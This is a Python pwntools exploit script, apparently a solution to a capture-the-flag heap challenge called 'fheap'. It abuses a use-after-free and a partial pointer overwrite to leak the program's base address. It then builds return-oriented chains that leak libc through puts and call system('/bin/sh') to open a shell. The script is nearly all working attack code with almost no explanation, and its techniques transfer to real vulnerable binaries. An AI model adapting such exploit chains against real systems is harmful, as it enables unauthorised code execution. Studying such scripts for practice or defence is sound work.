#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']
elf = ELF('./fheap')
# libc = ELF('libc.so.6')
libc = elf.libc
p=process('./fheap')

def create(size, s):
    p.recvuntil('quit\n')
    p.sendline('create ')
    p.recvuntil('size:')
    p.sendline(str(size))
    p.recvuntil('str:')
    p.send(s)

def delete(index):
    p.recvuntil('quit\n')
    p.sendline('delete ')
    p.recvuntil('id:')
    p.sendline(str(index))
    p.recvuntil('sure?:')
    p.sendline('yes')

def debug():
    gdb.attach(p)
    pause()

create(10,'012345678\x00')# 0 10
create(10,'012345678\x00')# 1 10
# create(10,'0123456789')# 2 10

# delete(2)
delete(1)
delete(0)

create(0x20, b'1'*24 + b'\x1a\x00')# 0 0x30 没有 \x00 截断，就会发生魔法，跟 strncpy 有关
# create(0x20, b'1'*24 + p64(0xd2d))# 0 0x30

delete(1)

p.recvuntil('1'*24)
elf_base = u64(p.recv(6).ljust(8, b'\x00')) - 0xd1a
log.success('elf_base: ' + hex(elf_base))
elf.address = elf_base
puts_plt = elf.plt['puts']
log.success('puts_plt: ' + hex(puts_plt))
puts_got = elf.got['puts']
log.success('puts_got: ' + hex(puts_got))
rdi_addr = elf_base + 0x11e3
log.success('rdi_addr: ' + hex(rdi_addr))
pop4_addr = elf_base + 0x11dc
log.success('pop4_rdi: ' + hex(pop4_addr))
ret_addr = elf_base + 0x949
log.success('ret_addr: ' + hex(ret_addr))

# leak libc
# debug()
delete(0)

payload = b'1'*24 + p64(pop4_addr)
create(0x20, payload)
# delete(1)
p.recvuntil('quit\n')
p.sendline('delete ')
p.recvuntil('id:')
p.sendline(str(1))
p.recvuntil('sure?:')
main_addr = 0xBEE+elf_base
payload = b'yesaaaaa' + p64(rdi_addr) + p64(elf.got['puts']) + p64(puts_plt) + p64(main_addr)

p.send(payload)

puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
log.success('puts_addr: ' + hex(puts_addr))

libc.address = puts_addr - libc.sym['puts']
log.success('libc.address: ' + hex(libc.address))

system_addr = libc.sym['system']
log.success('system_addr: ' + hex(system_addr))

binsh_addr = next(libc.search(b'/bin/sh'))
log.success('binsh_addr: ' + hex(binsh_addr))


delete(0)

payload = b'1'*24 + p64(pop4_addr)
create(0x20, payload)
# delete(1)
p.recvuntil('quit\n')
p.sendline('delete ')
p.recvuntil('id:')
p.sendline(str(1))
p.recvuntil('sure?:')
payload = b'yesaaaaa' + p64(rdi_addr) + p64(binsh_addr) + p64(ret_addr)+ p64(system_addr)
p.sendline(payload)

p.interactive()
